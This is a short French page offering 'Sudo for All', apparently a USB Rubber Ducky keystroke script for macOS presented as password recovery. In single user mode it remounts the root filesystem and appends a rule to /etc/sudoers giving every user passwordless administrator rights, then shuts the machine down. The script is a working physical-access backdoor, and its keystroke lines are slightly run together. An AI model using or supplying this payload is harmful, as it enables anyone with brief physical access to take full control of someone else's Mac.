Script - Sudo for All

Contourne le mot de passe administrateur en cas d'oubli.

Vous êtes seul responsable de votre utilisation de ce script.

Système(s) d'exploitation :

MacOS (en l'absence de mot de passe firmware)

Fonctionnalités :

Permet de contourner la nécessité des mots de passe pour un accès administrateur à une machine Apple. Pratique en cas d'oubli de mot de passe.

Déroulement du script :

  1. Ajout d'une ligne dans le fichier des utilisateurs habilités à utiliser les commandes administrateur.

Le script : 


          DELAY 3000
          REM	###	Lancer d'abord la machine en single user mode
          DELAY 1000STRING mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now
          ENTER
